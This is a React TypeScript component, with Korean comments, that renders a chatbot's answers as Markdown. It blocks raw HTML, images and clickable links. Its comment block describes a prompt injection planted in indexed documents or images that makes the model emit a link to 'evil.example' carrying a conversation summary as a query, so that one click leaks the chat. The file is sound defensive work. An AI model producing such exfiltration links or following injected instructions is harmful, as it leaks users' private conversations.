import type { ReactNode } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkCjkFriendly from 'remark-cjk-friendly'
import remarkGfm from 'remark-gfm'

/**
 * 답변 본문의 마크다운(#270). 모델이 굵게 · 목록 · 표 · 제목으로 답하는데 평문으로 그리면 `**` 와 `|---|` 가
 * 글자 그대로 보였다.
 *
 * - **원시 HTML 은 그리지 않는다.** react-markdown 의 기본값(rehype-raw 를 붙이지 않음)이다 - 모델 출력이
 *   스크립트 · 이벤트 속성을 실어 오는 길이 되면 안 된다. `javascript:` 같은 위험한 링크 스킴은 기본 urlTransform 이 지운다
 * - **마크다운 이미지(`![](url)`)는 그리지 않는다(#359).** 그리면 모델 출력에 실린 바깥 주소를 브라우저가 곧바로 불러
 *   대화에서 뽑은 값이 쿼리로 새어 나갈 수 있다. 문서 그림은 이 경로가 아니라 그림 표식으로 온다.
 *   **자리에는 alt 문구만 남긴다(#365)** - 통째로 지우면 설명 글이 사라지고 `[![x](img)](url)` 은 글자 없는 빈 링크가 됐다
 * - **마크다운 링크(`[글](url)`)도 누를 수 없는 글자로 낮춘다(#414).** 색인 문서나 첨부 이미지에 심은 프롬프트 주입으로 모델이
 *   `[자세히](https://evil.example/?q=<대화 요약>)` 를 내면 한 번 클릭으로 대화 내용이 바깥으로 나간다 - 이미지와 같은 위협이다.
 *   **글자 옆에 `(호스트)` 를 밝혀** 어디를 가리키는지는 보이게 하고, 호스트를 못 읽는 값(상대 경로 · http(s) 아님 · 깨진 값)은 글자만 남긴다.
 *   출처 목록 · 그림처럼 앱이 만든 링크는 이 경로를 거치지 않는다
 * - 표는 가로로만 스크롤되는 상자에 넣는다 - 모바일 폭에서 화면 전체를 밀어내지 않게
 * - 그림 표식(`[[그림:키]]`)은 여기 오기 전에 잘려 나간다(splitFigures). 이 컴포넌트는 표식 사이의 글만 받는다
 * - **한국어 조사 앞의 굵게를 닫는다(#287).** 표준 강조 규칙은 닫는 `**` 앞이 문장부호 · 뒤가 글자면 안 닫는다 -
 *   `**설계불량(부품선정오류)**으로` 가 글자 그대로 보였다. remark-cjk-friendly 가 CJK 글자 옆에서 이 규칙을 푼다
 */
// 답변 버블 안이라 한 단계씩 낮춰 그린다 - h1·h2 는 h3, h3·h4 는 h4
const heading = ({ children }: { children?: ReactNode }) => (
  <h3 className="mt-4 mb-2 text-base font-semibold first:mt-0">{children}</h3>
)
const subheading = ({ children }: { children?: ReactNode }) => (
  <h4 className="mt-3 mb-1.5 font-semibold first:mt-0">{children}</h4>
)

// 호스트를 읽을 수 있는 http(s) 주소만 호스트를 돌려준다 - 상대 경로 · 다른 스킴 · 깨진 값은 null
function hostOf(href: string | undefined): string | null {
  if (!href) return null
  try {
    const url = new URL(href)
    return url.protocol === 'http:' || url.protocol === 'https:' ? url.host : null
  } catch {
    return null
  }
}

const components: Components = {
  p: ({ children }) => <p className="my-2 break-words first:mt-0 last:mb-0">{children}</p>,
  ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
  li: ({ children }) => <li className="break-words">{children}</li>,
  h1: heading,
  h2: heading,
  h3: subheading,
  h4: subheading,
  strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
  a: ({ href, children }) => {
    const host = hostOf(href)
    return (
      <>
        {children}
        {host && ` (${host})`}
      </>
    )
  },
  blockquote: ({ children }) => (
    <blockquote className="my-2 border-l-2 border-line pl-3 text-ink-muted">{children}</blockquote>
  ),
  code: ({ children }) => (
    <code className="rounded bg-surface px-1 py-0.5 font-mono text-[0.9em]">{children}</code>
  ),
  pre: ({ children }) => (
    <pre className="my-2 overflow-x-auto rounded-lg bg-surface p-3 text-[13px] [&_code]:bg-transparent [&_code]:p-0">
      {children}
    </pre>
  ),
  table: ({ children }) => (
    <div className="my-2 max-w-full overflow-x-auto">
      <table className="w-max min-w-full border-collapse text-[14px]">{children}</table>
    </div>
  ),
  th: ({ children, style }) => (
    <th style={style} className="border border-line bg-surface px-2.5 py-1.5 text-left font-semibold">
      {children}
    </th>
  ),
  td: ({ children, style }) => (
    <td style={style} className="border border-line px-2.5 py-1.5 align-top">
      {children}
    </td>
  ),
  hr: () => <hr className="my-3 border-line" />,
  img: ({ alt }) => <>{alt}</>,
}

export default function Markdown({ text }: { text: string }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm, remarkCjkFriendly]}
      components={components}
    >
      {text}
    </ReactMarkdown>
  )
}
